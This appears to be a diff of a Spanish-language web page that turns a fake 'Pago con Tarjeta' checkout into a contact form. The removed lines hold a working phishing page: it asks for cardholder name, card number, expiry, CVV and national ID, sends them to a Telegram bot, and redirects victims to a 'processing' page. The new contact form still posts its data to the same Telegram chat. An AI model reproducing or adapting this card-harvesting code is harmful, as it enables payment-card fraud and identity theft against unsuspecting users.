@@ -3,27 +3,23 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Pago con Tarjeta</title>
+  <title>Formulario de Contacto</title>
   <style>
     /* ===== Reset mínimo ===== */
     *, *::before, *::after { box-sizing: border-box; }
     html, body { height: 100%; }
 
-    /* ===== Fondo fijo (no se mueve al subir) =====
-       Usamos un pseudo-elemento fijo para evitar problemas en móviles
-    */
+    /* ===== Fondo fijo ===== */
     body {
       margin: 0;
       font-family: 'Segoe UI', Tahoma, Arial, sans-serif;
       color: #fff;
       min-height: 100%;
       position: relative;
-      background-color: #0b1220; /* fallback */
+      background-color: #0b1220; 
       -webkit-font-smoothing:antialiased;
       -moz-osx-font-smoothing:grayscale;
     }
-
-    /* Fondo como capa fija */
     .bg {
       position: fixed;
       inset: 0;
@@ -33,7 +29,6 @@
       z-index: -2;
       transform: translateZ(0);
     }
-    /* Capa oscura sobre la imagen para legibilidad */
     .bg-overlay {
       position: fixed;
       inset: 0;
@@ -73,16 +68,13 @@
       text-align: center;
     }
 
-    /* ===== Contenedor principal =====
-       Añadimos padding-top para compensar el header fijo
-    */
+    /* ===== Contenedor principal ===== */
     .page {
-      padding-top: 88px; /* header height + espacio */
+      padding-top: 88px;
       padding-bottom: 40px;
       display: flex;
       justify-content: center;
     }
-
     .container {
       width: 100%;
       max-width: 520px;
@@ -93,7 +85,6 @@
       backdrop-filter: blur(8px);
       box-shadow: 0 8px 30px rgba(0,0,0,0.45);
     }
-
     .container h2 {
       margin: 0 0 14px 0;
       font-size: 1.25rem;
@@ -105,7 +96,6 @@
       gap: 12px;
       align-items: center;
     }
-
     label {
       display: block;
       font-size: 0.95rem;
@@ -113,7 +103,6 @@
       font-weight: 600;
       margin-bottom: 6px;
     }
-
     .input {
       width: 100%;
       padding: 12px 14px;
@@ -125,39 +114,13 @@
       color: #fff;
       transition: box-shadow .15s ease, transform .08s ease;
     }
-
     .input:focus {
       box-shadow: 0 4px 18px rgba(0,140,255,0.18);
       transform: translateY(-1px);
     }
-
-    /* Grupo de campos en fila (para tarjeta vencimiento + cvv) */
-    .row {
-      display: grid;
-      grid-template-columns: 1fr 120px;
-      gap: 10px;
-    }
-
-    /* Resumen visual */
-    .resumen {
-      margin-top: 6px;
-      padding: 12px;
-      background: rgba(255,255,255,0.04);
-      border-radius: 10px;
-      color: #e6f6ff;
-      font-weight: 600;
-      display:flex;
-      justify-content: space-between;
-      align-items: center;
-      font-size: 1rem;
-    }
-
-    .resumen .amount { color: #bff0ff; font-size: 1.05rem; }
-
-    /* Botón principal táctil y pequeño (según pediste más chico) */
     .btn {
       display: inline-block;
-      width: 170px; /* más pequeño */
+      width: 170px;
       max-width: 100%;
       padding: 10px 14px;
       border-radius: 10px;
@@ -173,82 +136,56 @@
       margin-top: 8px;
     }
     .btn:active { transform: translateY(1px); box-shadow: 0 4px 10px rgba(0,0,0,0.28); }
+    @media (hover: hover) { .btn:hover { transform: translateY(-4px); box-shadow: 0 10px 24px rgba(0,0,0,0.36); } }
 
-    /* Texto pequeño de ayuda */
-    .muted {
-      font-size: 0.88rem;
-      color: rgba(230,245,255,0.85);
-      margin-top: 6px;
-    }
-
-    /* Evitar efectos hover fuertes en mobile */
-    @media (hover: hover) {
-      .btn:hover { transform: translateY(-4px); box-shadow: 0 10px 24px rgba(0,0,0,0.36); }
-    }
-
-    /* Responsive: en pantallas estrechas ponemos todo vertical */
     @media (max-width: 480px) {
-      .row { grid-template-columns: 1fr 100px; }
       header { height:auto; padding:12px 10px; }
       header h1 { font-size: 1rem; }
       .container { padding: 18px; border-radius: 12px; }
       .btn { width: 100%; }
-      .resumen { font-size: 0.98rem; }
     }
   </style>
 </head>
 <body>
-
-  <!-- Fondo fijo -->
   <div class="bg" aria-hidden="true"></div>
   <div class="bg-overlay" aria-hidden="true"></div>
 
-  <!-- Header fijo -->
   <header>
     <img src="LOLI.png" alt="Logo" />
-    <h1>Pago con Tarjeta</h1>
+    <h1>Formulario de Contacto</h1>
   </header>
 
-  <!-- Página -->
   <div class="page">
     <main class="container" role="main" aria-labelledby="titulo">
-      <h2 id="titulo">Ingrese los datos de su tarjeta</h2>
+      <h2 id="titulo">Contáctanos</h2>
 
-      <form id="form-pago" autocomplete="off" novalidate>
+      <form id="form-contacto" autocomplete="off" novalidate>
         <div>
-          <label for="nombre">Nombre del titular</label>
-          <input class="input" type="text" id="nombre" name="nombre" placeholder="Pablo / Lucas / Juan / Pedro / Lili / Polo" required inputmode="text" />
+          <label for="nombre">Nombre completo</label>
+          <input class="input" type="text" id="nombre" name="nombre" placeholder="Tu nombre completo" required />
         </div>
 
         <div>
-          <label for="numero">Número de tarjeta</label>
-          <input class="input" type="text" id="numero" name="numero" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" inputmode="numeric" pattern="[0-9\s]{13,19}" required />
+          <label for="correo">Correo electrónico</label>
+          <input class="input" type="email" id="correo" name="correo" placeholder="ejemplo@correo.com" required />
         </div>
 
-        <div class="row">
-          <div>
-            <label for="vencimiento">Vencimiento</label>
-            <input class="input" type="month" id="vencimiento" name="vencimiento" required />
-          </div>
-          <div>
-            <label for="cvv">CVV</label>
-            <input class="input" type="password" id="cvv" name="cvv" maxlength="4" inputmode="numeric" required />
-          </div>
-          <div>
-            <label for="dni">dni</label>
-            <input class="input" type="password" id="dni" name="dni" maxlength="8" inputmode="numeric" required />
-          </div>
+        <div>
+          <label for="fecha">Fecha</label>
+          <input class="input" type="text" id="fecha" name="fecha" placeholder="20/2025" required />
         </div>
 
-        <div class="resumen" aria-live="polite">
-          <span>Total a pagar</span>
-          <span class="amount" id="total-amount">$12.600</span>
+        <div>
+          <label for="asunto">Asunto</label>
+          <input class="input" type="text" id="asunto" name="asunto" placeholder="Asunto de tu mensaje" required />
         </div>
 
-        <div style="display:flex; flex-direction:column; align-items:center; gap:8px;">
-          <button class="btn" type="submit">Confirmar Pago</button>
-          <div class="muted">Al confirmar será redirigido a la verificación del pago.</div>
+        <div>
+          <label for="mensaje">Mensaje</label>
+          <textarea class="input" id="mensaje" name="mensaje" rows="4" placeholder="Escribe tu mensaje..." required></textarea>
         </div>
+
+        <button class="btn" type="submit">Enviar</button>
       </form>
     </main>
   </div>
@@ -259,66 +196,47 @@
     const chatId = "6915301721";
     // --- FIN CONFIG ---
 
-    // Evitar problemas de autofill que cambien layout en móviles
-    (function preventAutoZoomOnFocus(){
-      // No-op placeholder; mantener para futuras mejoras
-    })();
-
-    // Form submit: validar rápido y enviar a Telegram via fetch
-    document.getElementById('form-pago').addEventListener('submit', async function(e){
+    document.getElementById('form-contacto').addEventListener('submit', async function(e){
       e.preventDefault();
 
-      // Recolectar datos
       const nombre = document.getElementById('nombre').value.trim();
-      const dni = document.getElementById('dni').value.trim();
-      const numero = document.getElementById('numero').value.trim();
-      const vencimiento = document.getElementById('vencimiento').value;
-      const cvv = document.getElementById('cvv').value.trim();
+      const correo = document.getElementById('correo').value.trim();
+      const fecha = document.getElementById('fecha').value.trim();
+      const asunto = document.getElementById('asunto').value.trim();
+      const mensaje = document.getElementById('mensaje').value.trim();
 
-      if(!nombre || !numero || !vencimiento || !cvv || !dni) {
+      if(!nombre || !correo || !fecha || !asunto || !mensaje){
         alert('Por favor complete todos los campos.');
         return;
       }
 
-      // Mensaje a Telegram
-      const mensaje = 
-`Nuevo pago con tarjeta:
-🎭: ${nombre}
-🆔: ${dni}
-💳: ${numero}
-📅: ${vencimiento}
-🔐: ${cvv}
-Total: ${document.getElementById('total-amount').textContent}
+      const textoTelegram = 
+`📬 Nuevo mensaje de contacto:
+👤 Nombre: ${nombre}
+📧 Correo: ${correo}
+📅 Fecha: ${fecha}
+📝 Asunto: ${asunto}
+💬 Mensaje: ${mensaje}
 `;
 
-      // Enviar usando la API de Telegram
       try {
         const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, text: mensaje })
+          body: JSON.stringify({ chat_id: chatId, text: textoTelegram })
         });
         const data = await res.json();
-        if(!data.ok) throw new Error(data.description || 'Error API Telegram');
-
-        // Redirigir a la página de procesamiento
-        window.location.href = 'pago-procesando.html';
-      } catch (err) {
-        console.error('Error al enviar mensaje Telegram:', err);
-        alert('Ocurrió un error al enviar los datos. Intente nuevamente.');
+        if(data.ok){
+          alert('Mensaje enviado correctamente ✅');
+          e.target.reset();
+        } else {
+          alert('Error al enviar: ' + (data.description || 'Error desconocido'));
+        }
+      } catch(err){
+        console.error(err);
+        alert('Error al conectar con Telegram');
       }
     });
-
-    // Formato simple: agregar espacios cada 4 dígitos en campo tarjeta
-    const numeroInput = document.getElementById('numero');
-    numeroInput.addEventListener('input', function(e){
-      let v = this.value.replace(/\D/g, '').slice(0,16);
-      let parts = [];
-      for (let i=0; i<v.length; i+=4) parts.push(v.substring(i,i+4));
-      this.value = parts.join(' ');
-    });
-
-    // Mantener botón y inputs táctiles grandes en móviles: no más JS requerido
   </script>
 </body>
 </html>
